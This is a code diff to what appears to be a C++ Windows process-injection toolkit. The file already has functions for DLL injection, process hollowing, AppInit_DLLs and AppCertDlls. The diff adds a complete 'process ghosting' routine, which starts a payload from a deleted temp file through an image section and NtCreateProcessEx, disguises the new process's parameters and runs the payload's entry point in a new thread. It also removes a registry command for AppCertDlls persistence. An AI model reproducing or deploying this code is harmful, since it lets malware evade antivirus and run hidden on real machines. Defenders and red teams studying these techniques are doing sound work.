@@ -9,13 +9,15 @@
 #include <vector>
 #include <string>
 #include <DbgHelp.h>
-
+#include <userenv.h>
 
 #include "Utiliti.h"
 
 using namespace std;
 
 #pragma comment(lib, "Dbghelp.lib")
+#pragma comment(lib, "Ntdll.lib")
+#pragma comment(lib, "Userenv.lib")
 
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName);
@@ -29,6 +31,8 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
 DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
 DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
+
+DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath);
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -576,8 +580,6 @@ DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName) {
 	return 0;
 }
 
-
-//reg ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /V "AppCert.dll" /T REG_SZ /D "%SystemRoot%\System32\AppCert.dll" /F
 DWORD InjectUsingAppCertDlls(WCHAR* DLLName) {
 
 	BOOL Status = 0;
@@ -595,4 +597,69 @@ DWORD InjectUsingAppCertDlls(WCHAR* DLLName) {
 	}
 
 	return 0;
+}
+
+
+// can inject 64bit in 64bit, 64bit in 32bit but 32bit in 32bit work only on 32bit windows
+DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath) {
+
+	HMODULE hNTDLL = GetModuleHandleA("ntdll");
+	_NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
+	_NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
+	_NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
+
+	BYTE* PayloadData = ReadDataFromFile(PayloadPath);
+
+	DWORD PayloadSize = GetSizeOfFile(PayloadPath);
+
+	WCHAR DummyName[MAX_PATH] = { 0 };
+	WCHAR TempPath[MAX_PATH] = { 0 };
+	DWORD size = GetTempPathW(MAX_PATH, TempPath);
+	GetTempFileNameW(TempPath, L"TH", 0, DummyName);
+
+	HANDLE hSection = GetSectionHandleFromFileThenDeleteFileOnClose(DummyName, PayloadData, PayloadSize);
+	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
+
+	HANDLE hProcess = nullptr;
+	NTSTATUS status = fnNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+	if (status != 0) {
+		printf("Failed in NtCreateProcessEx Error Code 0x%x\n " , GetLastError());
+		if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
+			printf("[!] Failed The payload has mismatching bitness\n ");
+		}
+		return -1;
+	}
+
+	PROCESS_BASIC_INFORMATION pi = {0};
+
+	DWORD ReturnLength = 0;
+	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
+	if (status!=0) {
+		printf("Failed in NtQueryInformationProcess Error Code 0x%x\n ", GetLastError());
+		return -1;
+	}
+	PEBmy* PebCopy = ReadRemotePEB(hProcess);
+
+	ULONGLONG imageBase = (ULONGLONG)PebCopy->ImageBaseAddress;
+
+	DWORD payloadEntryPointRVA = GetEntryPointRVA(PayloadData);
+	ULONGLONG procEntry = payloadEntryPointRVA + imageBase;
+
+
+	if (SetProcessParametar(hProcess, pi, TargetProcessName) == -1) {
+		printf("Failed in setuping Parameters Error Code 0x%x\n ", GetLastError());
+		return -1;
+	}
+
+	HANDLE hThread = NULL;
+	status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
+	if (status != 0) {
+		printf("Failed in NtCreateThreadEx Error Code 0x%x\n ", GetLastError());
+		return -1;
+	}
+
+	return 0;
+
 }
